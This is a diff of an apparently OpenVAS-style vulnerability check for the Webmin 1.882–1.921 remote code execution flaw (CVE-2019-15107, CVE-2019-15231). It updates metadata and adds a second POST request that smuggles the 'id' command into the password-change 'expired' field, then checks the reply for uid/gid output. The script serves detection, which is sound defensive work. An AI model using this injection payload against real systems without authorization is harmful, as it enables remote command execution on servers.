@@ -21,8 +21,8 @@ CPE = "cpe:/a:webmin:webmin";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.142742");
-  script_version("2019-08-19T06:36:46+0000");
-  script_tag(name:"last_modification", value:"2019-08-19 06:36:46 +0000 (Mon, 19 Aug 2019)");
+  script_version("2019-08-21T02:45:47+0000");
+  script_tag(name:"last_modification", value:"2019-08-21 02:45:47 +0000 (Wed, 21 Aug 2019)");
   script_tag(name:"creation_date", value:"2019-08-19 06:13:45 +0000 (Mon, 19 Aug 2019)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -31,7 +31,7 @@ if(description)
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_cve_id("CVE-2019-15105");
+  script_cve_id("CVE-2019-15107", "CVE-2019-15231");
 
   script_name("Webmin 1.882 <= 1.921 Remote Code Execution (RCE) Vulnerability");
 
@@ -87,6 +87,18 @@ req = http_post_req(port: port, url: url, add_headers: headers, data: data);
 res = http_send_recv(port: port, data: req);
 
 if (res =~ "^HTTP/1\.[01] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+") {
+  uid = eregmatch(pattern: "uid=[0-9]+.*gid=[0-9]+[^<]+", string: res);
+  report = 'It was possible to execute the "id" command.\n\nResult:\n\n' + uid[0];
+  security_message(port: port, data: report);
+  exit(0);
+}
+
+data = "user=" + user + "&pam=&expired=2|id&old=test&new1=test2&new2=test2";
+
+req = http_post_req(port: port, url: url, add_headers: headers, data: data);
+res = http_send_recv(port: port, data: req);
+
+if (res =~ "uid=[0-9]+.*gid=[0-9]+") {
   uid = eregmatch(pattern: "uid=[0-9]+.*gid=[0-9]+[^<]+", string: res);
   report = 'It was possible to execute the "id" command.\n\nResult:\n\n' + uid[0];
   security_message(port: port, data: report);
